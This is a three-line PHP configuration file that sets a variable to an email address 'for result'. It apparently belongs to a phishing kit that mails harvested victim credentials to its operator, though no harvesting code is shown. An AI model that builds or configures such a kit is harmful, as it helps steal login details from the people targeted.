<?php
$send="ade@yahoo.com"// your email address for result
?>